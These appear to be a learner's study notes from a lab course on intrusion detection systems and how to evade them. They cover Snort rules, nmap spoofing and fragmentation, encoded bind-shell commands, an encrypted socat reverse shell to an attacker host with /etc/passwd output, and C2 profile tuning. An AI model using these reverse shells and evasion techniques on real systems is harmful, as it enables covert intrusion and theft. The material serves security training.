An Intrusion Detection System (IDS) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions.

Understanding the difference between _detection_ and _prevention_ is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as an IDS or an IPS. For Snort to function as an IPS, it needs some mechanism to block (`drop`) offending connections. This capability requires Snort to be set up as `inline` and to bridge two or more network cards.

IDS setups can be divided based on their location in the network into:
1. Host-based IDS (HIDS)
2. Network-based IDS (NIDS)

The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host.

The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic.

In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS.

![[Pasted image 20240902023307.png]]

## **IDS Engine Types**
We can classify network traffic into:
1. **Benign traffic**: This is the usual traffic that we expect to have and don’t want the IDS to alert us about.
2. **Malicious traffic**: This is abnormal traffic that we don’t expect to see under normal conditions and consequently want the IDS to detect it.

Consequently, the detection engine of an IDS can be:
1. **Signature-based**: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against.
2. **Anomaly-based**: This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to “teach” the IDS what normal is so that it can recognize what is **not** normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.

## **IDS/IPS Rule Triggering**
Each IDS/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: `Rule Header (Rule Options)`, where **Rule Header** constitutes:

1. Action: Examples of action include `alert`, `log`, `pass`, `drop`, and `reject`.
2. Protocol: `TCP`, `UDP`, `ICMP`, or `IP`.
3. Source IP/Source Port: `!10.10.0.0/16 any` refers to everything not in the class B subnet `10.10.0.0/16`.
4. Direction of Flow: `->` indicates left (source) to right (destination), while `<>` indicates bi-directional traffic.
5. Destination IP/Destination Port: `10.10.0.0/16 any` to refer to class B subnet `10.10.0.0/16`.

below is an example rule to `drop` all ICMP traffic passing through Snort IPS:

`drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)`

The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is “ICMP Ping Scan.”

Let’s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands.

Let’s consider the following “naive” approach. We want to create a Snort rule that detects the term `ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)`

The rule above inspects the content of the packets exchanged with port 80 for the string `ncat`. Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. `ncat` in ASCII is written as `6e 63 61 74` in hexadecimal and it is encapsulated as a string by 2 pipe characters `|`.

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)`

We can further refine it if we expect to see it in HTTP POST requests. Note that `flow:established` tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections).

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)`

*Note:*
	There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using `ncat` verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are.

## **Evasion via Protocol Manipulation**
Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems.
1. Evasion via Protocol Manipulation
2. Evasion via Payload Manipulation
3. Evasion via Route Manipulation
4. Evasion via Tactical Denial of Service (DoS)


![[Pasted image 20240902031207.png]]

1. Evasion via **protocol manipulation** includes:
	- Relying on a different protocol;
	- Manipulating (Source) TCP/UDP port;
	- Using session splicing (IP packet fragmentation);
	- Sending invalid packets;
	![[Pasted image 20240902031602.png]]

### Rely on a Different Protocol
The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don’t create too much noise.

We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS.
	![[Pasted image 20240902032245.png]]

Ncat, by default, uses a TCP connection; however, you can get it to use UDP using the option `-u`.
- To listen using TCP, just issue `ncat -lvnp PORT_NUM` where port number is the port you want to listen to.
- to connect to an Ncat instance listening on a TCP port, you can issue `ncat TARGET_IP PORT_NUM`

Note that:
- `-l` tells `ncat` to listen for incoming connections
- `-v` gets more verbose output as `ncat` binds to a source port and receives a connection
- `-n` avoids resolving hostnames
- `-p` specifies the port number that `ncat` will listen on

As already mentioned, using `-u` will move all communications over UDP.
- To listen using UDP, just issue `ncat -ulvnp PORT_NUM` where port number is the port you want to listen to. Note that unless you add `-u`, `ncat` will use TCP by default.
- To connect to an Ncat instance listening on a UDP port, you can issue `nc -u TARGET_IP PORT_NUM`

Consider the following two examples:
- Running `ncat -lvnp 25` on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
- Executing `ncat -ulvnp 162` on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.
- 
### Manipulate (Source) TCP/UDP Port
Generally speaking, the TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments.

Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using Nmap, you can add the option `-g PORT_NUMBER` (or `--source-port PORT_NUMBER`) to make Nmap send all its traffic from a specific source port number.

While scanning a target, use `nmap -sS -Pn -g 80 -F 10.10.243.169` to make the port scanning traffic appear to be exchanged with an HTTP server at first glance.
	 **`-sS`**: Initiates a TCP SYN scan (also known as a stealth scan). It sends SYN packets to the target and waits for responses to determine the open ports. It's called "stealth" because it doesn't complete the TCP handshake, making it less likely to be logged by the target system.
	 **`-Pn`**: Disables host discovery. Nmap will not attempt to ping the host before scanning and will proceed as if the host is up. This is useful if the target is behind a firewall that blocks ICMP requests or if you want to avoid detection by skipping the ping step.
	 **`-g 80`**: Sets the source port to 80. This option specifies the port number that Nmap will use as the source port for the scan. Using port 80 (HTTP) can sometimes bypass firewalls or other security mechanisms that might otherwise block the scan, as traffic from port 80 is often allowed.
	 **`-F`**: Enables a fast scan. Nmap will scan only the most common 100 ports instead of all 65,535. This speeds up the scan significantly but may miss some services running on less common ports.
	 **`10.10.243.169`**: The target IP address to be scanned.

If you are interested in scanning UDP ports, you can use `nmap -sU -Pn -g 53 -F 10.10.243.169` to make the traffic appear to be exchanged with a DNS server.

	![[Pasted image 20240902034302.png]]


Consider the case where you are using netcat. You can try to camouflage the traffic as if it is some DNS traffic.
- On the attacker machine, if you want to use Ncat to listen on UDP port 53, as a DNS server would, you can use `ncat -ulvnp 53`.
- On the target, you can make it connect to the listening server using `ncat -u ATTACKER_IP 53`.

Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server.
- On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use `ncat -lvnp 80`.
- On the target, connect to the listening server using `nc ATTACKER_IP 80`.
	![[Pasted image 20240902034444.png]]


### Session Splicing (IP Packet Fragmentation)
Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won’t be triggered.

Nmap offers a few options to fragment packets. You can add:
- `-f` to set the data in the IP packet to 8 bytes.
- `-ff` to limit the data in the IP packet to 16 bytes at most.
- `--mtu SIZE` to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.

Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as [Fragroute](https://www.monkey.org/~dugsong/fragroute/). `fragroute` can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with `ip_frag SIZE` to fragment the IP data according to the provided size. The size should be a multiple of 8.

For example, you can create a configuration file `fragroute.conf` with one line, `ip_frag 16`, to fragment packets where IP data fragments don’t exceed 16 bytes. Then you would run the command `fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragmented packets it.

### Sending Invalid Packets
Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge.

Nmap makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have:
- Invalid TCP/UDP checksum
- Invalid TCP flags

Nmap lets you send packets with a wrong TCP/UDP checksum using the option `--badsum`. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.

Nmap also lets you send packets with custom TCP flags, including invalid ones. The option `--scanflags` lets you choose which flags you want to set.
- `URG` for Urgent
- `ACK` for Acknowledge
- `PSH` for Push
- `RST` for Reset
- `SYN` for Synchronize
- `FIN` for Finish

For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use `--scanflags SYNRSTFIN`, although this combination might not be beneficial for your purposes.

If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as `hping3`. We will list a few example options to give you an idea of packet crafting using `hping3`.
- `-t` or `--ttl` to set the Time to Live in the IP header
- `-b` or `--badsum` to send packets with a bad UDP/TCP checksum
- `-S`, `-A`, `-P`, `-U`, `-F`, `-R` to set the TCP SYN, ACK, PUSH, URG, FIN, and RST flags, respectively

There is a myriad of other options. Depending on your needs, you might want to check the `hping3` manual page for the complete list.

## **Evasion via Payload Manipulation**
Evasion via payload manipulation includes:
- Obfuscating and encoding the payload;
- Encrypting the communication channel;
- Modifying the shellcode;
![[Pasted image 20240902042303.png]]

### Obfuscate and Encode the Payload
Because the IDS rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication.

Consider the command `ncat -lvnp 1234 -e /bin/bash`, where `ncat` will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggering IDS/IPS signatures

#### Encode to Base64 format
You can use one of the many online tools that encode your input to Base64. Alternatively, you can use `base64` commonly found on Linux systems.
```shell-session
pentester@TryHackMe$ cat input.txt
ncat -lvnp 1234 -e /bin/bash
$ base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```

`ncat -lvnp 1234 -e /bin/bash` is encoded to `bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==`

#### URL Encoding
URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected. You can refer to [section 2.4 in RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986#section-2.4) for more information.

One utility that you can easily install on your Linux system is `urlencode`; alternatively, you can either use an online service or search for similar utilities on MS Windows and macOS. To follow along on the AttackBox, you can install `urlencode` by running the command `apt install gridsite-clients`.

```shell-session
pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
```

`ncat -lvnp 1234 -e /bin/bash` becomes `ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash` after URL encoding. Depending what the IDS/IPS signature is matching, URL encoding might help evade detection.

#### Use Escaped Unicode
Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, you can use [CyberChef](https://icyberchef.com/) to select and configure the Escape Unicode Characters recipe as shown in the image below.
![[Pasted image 20240902043300.png]]
If you use the format `\uXXXX`, then `ncat -lvnp 1234 -e /bin/bash` becomes `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`. It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.

### Encrypt the Communication Channel
Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.

One direct approach is to create the necessary encryption key on the attacker’s system and set `socat` to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
1. Create the key;
2. Listen on the attacker’s machine;
3. Connect to the attacker’s machine;

A) **Firstly**, on any Linux system, we can create the key using `openssl`.

The arguments in the above command are:
- `req` indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing;
- `-x509` specifies that we want an X.509 certificate;
- `-newkey rsa:4096` creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size,  as `-newkey rsa:2048`);
- `-days 365` shows that the validity of our certificate will be one year;
- `-subj` sets data, such as organization and country, via the command-line;
- `-nodes` simplifies our command and does not encrypt the private key;
- `-keyout PRIVATE_KEY` specifies the filename where we want to save our private key;
- `-out CERTIFICATE` specifies the filename to which we want to write the certificate request.

The above command returns:
- Private key: `thm-reverse.key`;
- Certificate: `thm-reverse.crt`;

The Privacy Enhanced Mail (PEM) `.pem` file requires the concatenation of the private key `.key` and the certificate `.crt` files. We can use `cat` to create our PEM file from the two files that we have just created:
	`cat thm-reverse.key thm-reverse.crt > thm-reverse.pem`.

B) **Secondly**, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.

`socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`

- `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
- `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
- `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
- `verify=0` disables checking peer’s certificate
- `fork` creates a sub-process to handle each new connection.

**Thirdly**, on the victim system, `socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash`. Note that the `EXEC` invokes the specified program.

Example:
	On the attacker system, we carried out the following:
```shell-session
pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
Generating a RSA private key
........................++++
......++++
writing new private key to 'thm-reverse.key'
-----
pentester@TryHackMe$ ls
thm-reverse.crt  thm-reverse.key
pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
```

As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:
```shell-session
pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

Back to the attacker system, let’s run `cat /etc/passwd`:

```shell-session
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
[...]
2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
[...]
```

However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as `cat /etc/passwd`. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains `cat /etc/passwd`; however, it is encrypted.
	![[Pasted image 20240902045551.png]]

As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent `socat` connection that does not use encryption.
1. On the attacker’s system, we run `socat -d -d TCP-LISTEN:4443,fork STDOUT`.
2. On the victim’s machine, we run `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
3. Back on the attacker’s system, we type `cat /etc/passwd` and hit Enter/Return.

Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.
	![[Pasted image 20240902050200.png]]

### Modify the data
Consider the simple case where you want to use Ncat to create a bind shell. The following command `ncat -lvnp 1234 -e /bin/bash` tells `ncat` to listen on TCP port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.
- Scanning for `ncat -lvnp` can be easily evaded by changing the order of the flags.
- On the other hand, inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
- If the IDS is looking for `ncat`, then simple changes to the original command won’t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as `nc` or `socat`. Alternatively, you can consider a different encoding if the target system can process it properly.

## **Evasion via Route Manipulation**
Evasion via route manipulation includes:
- Relying on source routing
- Using proxy servers
![[Pasted image 20240902051117.png]]
### Relying on Source Routing
In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option `--ip-options`. Nmap offers loose and strict routing:
- Loose routing can be specified using `L`. For instance, `--ip-options "L 10.10.10.50 10.10.50.250"` requests that your scan packets are routed through the two provided IP addresses.
- Strict routing can be specified using `S`. Strict routing requires you to set every hop between your system and the target host. For instance, `--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"` specifies that the packets go via these three hops before reaching the target host.

### Using Proxy Servers
The use of proxy servers can help hide your source. Nmap offers the option `--proxies` that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format `proto://host:port`. Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported.

Consider the following example. Instead of running `nmap -sS MACHINE_IP`, you would edit your Nmap command to something like `nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP`. This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source.

If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source.


## **Evasion via Tactical DoS**
Evasion via tactical DoS includes:
- Launching denial of service against the IDS/IPS
- Launching denial of Service against the logging server
![[Pasted image 20240902225146.png]]
An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can:
- Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
- Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.

## **C2 and IDS/IPS Evasion**
Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following:

- **User-Agent**: The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings.
- **Sleep Time**: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system.
- **Jitter**: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection.
- **SSL Certificate**: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time.
- **DNS Beacon**: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data.

## **Next-Gen Security**
Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market)
1. Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
2. Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
3. Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
4. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
5. Agile engine: Support upgrade paths to benefit from new information feeds.
